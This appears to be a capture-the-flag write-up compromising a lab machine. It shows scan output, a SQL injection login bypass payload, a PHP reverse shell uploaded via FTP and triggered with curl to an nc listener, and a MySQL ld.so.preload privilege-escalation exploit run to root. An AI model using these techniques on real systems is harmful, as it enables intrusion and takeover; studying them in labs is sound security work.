# Password Mismanagers
## Nmap:
```
# nmap 172.30.0.2
...
Nmap scan report for 172.30.0.2
Host is up (0.18s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
3306/tcp open  mysql
8000/tcp open  http-alt
...
```

## Dirbuster on Port 8000:
```
File found: /login.php - 200
File found: /register.php - 200
File found: /logout.php - 302
File found: /forgot.php - 200
File found: /settings.php - 302
File found: /dashboard.php - 302
File found: /remove.php - 302
File found: /run.sh - 200
File found: /reset.php - 200
File found: /activate.php - 200
```

## Login via SQL Injection:
If you try to register an account on port 8000, it won't work, as you get a `500 Internal Server Error`. So there must be another way to login. Using any email address + SQL Injection Payload bypasses user authentication and logs you in. I did it with `test@abc.com' OR 1=1 -- -`

Once logged in, you are able to see following credentials:

```
bigsbee: F54gB76&KxpF%3
admin: jF5t^3dW3dxh!
```

## FTP Login:
With the credentials of `bigsbee`, I was able to login to FTP. 
```
# ftp 172.30.0.2
Connected to 172.30.0.2.
220 (vsFTPd 3.0.2)
Name (172.30.0.2:root): bigsbee
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
```

As a wordpress blog was running on port 80 and the /uploads directory was available, I was able to upload a php reverse shell there:
```
ftp> cd /var/www/html/wp-content/uploads
ftp> put shell.php 
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (58.8599 MB/s)
```

Again I had to start my `nc` listener and trigger the reverse shell:

```
# nc -lvnp 8888
listening on [any] 8888 ...
...
# curl http://172.30.0.2/wp-content/uploads/shell.php
```

## Privilege Escalation
While I was on the machine, I discovered further credentials:
```
wp-config.php:
database: 
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'G53DF76gd21$');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

With the same password of wordpressuser, I was able to switch to user `mysql`. As the mysql version was `5.5.51`, I found the following privilege esclation exploit: https://www.exploit-db.com/exploits/40679. Running the exploit got me the root user and thus the flag:

```
bash-4.2$ ./exploit.sh /var/lib/mysql/aa099024646e.err
...
[+] Starting the exploit as 
uid=999(mysql) gid=998(mysql) groups=998(mysql)

[+] Target MySQL log file set to /var/lib/mysql/aa099024646e.err

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 mysql mysql 964600 Mar 22 16:17 /tmp/mysqlrootsh

[+] Symlink created at: 
lrwxrwxrwx 1 mysql mysql 18 Mar 22 16:17 /var/lib/mysql/aa099024646e.err -> /etc/ld.so.preload

[+] Waiting for MySQL to re-open the logs/MySQL service restart...
Do you want to kill mysqld process to instantly get root? :) ? [y/n] y
Got it. Executing 'killall mysqld' now...

[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: 
-rw-r----- 1 mysql root 19 Mar 22 16:17 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 964600 Mar 22 16:17 /tmp/mysqlrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 964600 Mar 22 16:17 /tmp/mysqlrootsh

Got root! The database server has been ch-OWNED !

[+] Spawning the rootshell /tmp/mysqlrootsh now! 

mysqlrootsh-4.2# id
uid=999(mysql) gid=998(mysql) euid=0(root) groups=998(mysql)
mysqlrootsh-4.2# cd /root
mysqlrootsh-4.2# ls
Password-Manager  anaconda-ks.cfg  flag  services
mysqlrootsh-4.2# cat flag
two_six{c0n6r475_y0u_f0und_7h3_fl46_f8b9d92d6e96358087ad512cf062cee1}
```
